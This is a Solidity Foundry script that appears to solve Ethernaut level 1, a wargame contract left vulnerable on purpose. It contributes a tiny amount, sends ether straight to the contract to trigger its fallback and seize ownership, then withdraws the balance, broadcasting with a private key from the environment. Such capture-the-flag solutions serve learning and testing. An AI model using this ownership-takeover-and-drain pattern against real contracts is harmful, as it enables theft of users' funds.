// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "ethernaut/Ethernaut1.sol";
import "forge-std/Test.sol";
import "./EthernautTestHelpers.sol";

contract Attacker is Test, EthernautTestHelpers {
    Ethernaut1 level1;
    uint256 PKEY;
function setUp() public{
level1 = Ethernaut1(payable(0xDe622bBe5B6D8c9aeF667B7e902EBf3dFf369122));
// level1 = new Ethernaut1();
    PKEY = vm.envUint("DEPLOYMENT_KEY");

}

function run() public {
    test_payable();
}
    function test_payable() public{
        vm.startBroadcast(PKEY);

        address ownerOf = level1.owner();
        console.log("ownerOf: %s", ownerOf);
        
        // Contribute once to get a balance above 0.
        level1.contribute{value: 0.00001 ether}();
        uint contribution = level1.getContribution();
        console.log("contribution: %s", contribution);

        // Call the callback function to be made the owner
        (bool success,) = address(level1).call{value: 0.0001 ether}("");
        require(success, "failed to call level1");

        ownerOf = level1.owner();
        console.log("ownerOf: %s", ownerOf);
        require(ownerOf == TEST_WALLET_MAIN, "failed to become owner");
        
        level1.withdraw();

        vm.stopBroadcast();
    }

}